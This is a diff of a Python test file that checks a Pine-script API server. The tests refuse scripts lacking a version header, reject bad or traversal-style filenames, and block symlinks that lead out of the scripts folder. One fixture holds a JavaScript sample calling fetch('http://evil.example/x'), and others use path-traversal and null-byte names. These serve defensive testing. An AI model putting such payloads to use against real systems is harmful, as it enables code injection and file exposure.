@@ -34,12 +34,41 @@ def client(tmp_path, monkeypatch, scripts=None, runtime: bytes | None = None):
 
 
 def test_list_reads_version_kind_and_title_and_skips_other_files(tmp_path, monkeypatch):
-    with client(tmp_path, monkeypatch, {"rsi.pine": RSI, "my strat.pine": STRAT, "notes.txt": "x",
-                                        "old.pine": "// no header\nplot(close)\n"}) as c:
+    with client(tmp_path, monkeypatch, {"rsi.pine": RSI, "my strat.pine": STRAT, "notes.txt": "x"}) as c:
         got = c.get("/api/pine/scripts").json()
     assert got == [{"name": "my strat.pine", "version": 5, "kind": "strategy", "title": "Sniper"},
-                   {"name": "old.pine", "version": None, "kind": None, "title": None},
                    {"name": "rsi.pine", "version": 6, "kind": "indicator", "title": "RSI twin"}]
+
+
+# no marker the runtime sees = the Worker would run the text as raw JavaScript (review finding): never listed, never served
+NO_MARKER = {"old.pine": "// no header\nplot(close)\n",
+             "js.pine": "($) => { fetch('http://evil.example/x'); return {}; }",
+             "trail.pine": "//@version=6 foo\nindicator('x')\nplot(close)\n",
+             "inline.pine": "plot(close) //@version=6\n"}
+
+
+def test_a_script_without_the_runtimes_version_line_is_neither_listed_nor_served(tmp_path, monkeypatch):
+    with client(tmp_path, monkeypatch, {"rsi.pine": RSI, **NO_MARKER}) as c:
+        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["rsi.pine"]
+        for name in NO_MARKER:
+            r = c.get(f"/api/pine/scripts/{name}")
+            assert r.status_code == 404 and "//@version" in r.json()["detail"], name
+        assert c.get("/api/pine/scripts/rsi.pine").status_code == 200
+
+
+def test_the_version_line_is_the_runtimes_own_test():
+    ok = ["//@version=5\nx", "  //  @VERSION = 6  \nx", "// c\n//@version=6\r\nindicator('x')", "//@version=5"]
+    bad = ["//@version=5x", "//@version=\u0665\n", "//@version 5\n", "x //@version=5\n", ""]
+    assert all(P.script_meta("a.pine", t)["version"] is not None for t in ok), ok
+    assert all(P.script_meta("a.pine", t)["version"] is None for t in bad), bad
+
+
+def test_a_utf8_bom_is_not_part_of_the_script(tmp_path, monkeypatch):
+    sd = tmp_path / "scripts"
+    with client(tmp_path, monkeypatch) as c:
+        (sd / "bom.pine").write_bytes(b"\xef\xbb\xbf" + RSI.encode())
+        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["bom.pine"]
+        assert c.get("/api/pine/scripts/bom.pine").text == RSI
 
 
 def test_list_is_empty_without_the_folder(tmp_path, monkeypatch):
@@ -64,6 +93,31 @@ def test_unknown_and_bad_names_are_404(tmp_path, monkeypatch):
         assert c.get("/api/pine/scripts/rsi.py").status_code == 404
         assert c.get("/api/pine/scripts/..%2Frsi.pine").status_code == 404
         assert c.get("/api/pine/scripts/scripts%2Frsi.pine").status_code == 404
+
+
+def test_the_name_rule_takes_any_letter_up_to_255_characters(tmp_path, monkeypatch):
+    """catalog.js PINE_NAME is this rule (tests/js/catalog.test.mjs holds the same table): a name the server lists must survive the client."""
+    long_ok, long_bad = "x" * 250 + ".pine", "x" * 251 + ".pine"
+    good = ["a.pine", "my ema-2.v3.pine", "\u00e9.pine", "\u6307\u6807.pine", long_ok]
+    bad = ["a.py", ".pine", "a/b.pine", "..\\a.pine", "a.pine\n", "a\n.pine", "a\x00.pine", "a$.pine", long_bad]
+    assert all(P.NAME_RE.match(n) for n in good), good
+    assert not any(P.NAME_RE.match(n) for n in bad), bad
+    with client(tmp_path, monkeypatch, {"\u00e9.pine": RSI}) as c:
+        assert [s["name"] for s in c.get("/api/pine/scripts").json()] == ["\u00e9.pine"]
+        assert c.get("/api/pine/scripts/%C3%A9.pine").text == RSI
+
+
+def test_a_link_out_of_the_folder_is_neither_listed_nor_read(tmp_path, monkeypatch):
+    with client(tmp_path, monkeypatch, {"rsi.pine": RSI}) as c:
+        (tmp_path / "secret.pine").write_text(RSI.replace("RSI twin", "Outside Title"))
+        os.symlink(tmp_path / "secret.pine", tmp_path / "scripts" / "link.pine")
+        os.symlink(tmp_path / "scripts" / "rsi.pine", tmp_path / "scripts" / "same.pine")   # a link that stays inside is fine
+        os.symlink(tmp_path / "scripts" / "loop.pine", tmp_path / "scripts" / "loop.pine")
+        got = c.get("/api/pine/scripts").json()
+        assert [s["name"] for s in got] == ["rsi.pine", "same.pine"]
+        assert "Outside Title" not in str(got)
+        assert c.get("/api/pine/scripts/link.pine").status_code == 404
+        assert c.get("/api/pine/scripts/loop.pine").status_code == 404
 
 
 def test_a_name_that_resolves_outside_the_folder_is_refused(tmp_path, monkeypatch):
